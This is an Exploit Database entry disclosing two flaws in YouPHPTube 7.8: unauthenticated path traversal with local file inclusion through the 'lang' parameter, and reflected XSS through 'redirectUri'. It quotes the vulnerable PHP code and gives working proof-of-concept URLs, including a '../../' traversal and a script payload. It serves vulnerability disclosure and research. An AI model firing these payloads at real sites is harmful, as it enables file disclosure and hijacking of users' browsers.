# Exploit Title: YouPHPTube <= 7.8 - Multiple Vulnerabilities
# Discovery by: Rafael Pedrero
# Discovery Date: 2021-01-31
# Vendor Homepage: https://www.youphptube.com/
# Software Link : https://www.youphptube.com/
# Tested Version: 7.8
# Tested on:  Windows 7, 10 using XAMPP

# Vulnerability Type: LFI + Path Traversal

CVSS v3: 7.5
CVSS vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CWE: CWE-829, CWE-22

Vulnerability description: YouPHPTube v7.8 allows unauthenticated directory
traversal and Local File Inclusion through the parameter in an
/?lang=PATH+TRAVERSAL+FILE (without php) GET request because of an
include_once in locale/function.php page.

Proof of concept:

To detect: http://localhost/youphptube/index.php?lang=)

An error is generated:

Warning: preg_grep(): Compilation failed: unmatched parentheses at offset 0
in C:\xampp\htdocs\YouPHPTube\locale\function.php on line 47

In function.php page, we can see:

// filter some security here
if (!empty($_GET['lang'])) {
    $_GET['lang'] = str_replace(array("'", '"', """, "&#039;"),
array('', '', '', ''), xss_esc($_GET['lang']));
}

if (empty($_SESSION['language'])) {
    $_SESSION['language'] = $config->getLanguage();
}
if (!empty($_GET['lang'])) {
    $_GET['lang'] = strip_tags($_GET['lang']);
    $_SESSION['language'] = $_GET['lang'];
}
@include_once
"{$global['systemRootPath']}locale/{$_SESSION['language']}.php";

The parameter "lang" can be modified and load a php file in the server.

In Document root: /phpinfo.php with this content:

<?php echo phpinfo(); ?>

To Get phpinfo.php: http://127.0.0.1/youphptube/?lang=../../phpinfo

Note: phpinfo without ".php".

The new Path is:
@include_once "{$global['systemRootPath']}locale/../../phpinfo.php";

And you can see the PHP information into the browser.

# Vulnerability Type: reflected Cross-Site Scripting (XSS)

CVSS v3: 6.5
CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
CWE: CWE-79

Vulnerability description: YouPHPTube 7.8 and before, does not sufficiently
encode user-controlled inputs, resulting in a reflected Cross-Site
Scripting (XSS) vulnerability via the
/<YouPHPTube_path_directory>/signup?redirectUri=<XSS>, in redirectUri
parameter.

Proof of concept:

http://localhost/
<YouPHPTube_path_directory>/signup?redirectUri='"()%26%25<ScRipt>alert(1)</ScRipt>
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolis...
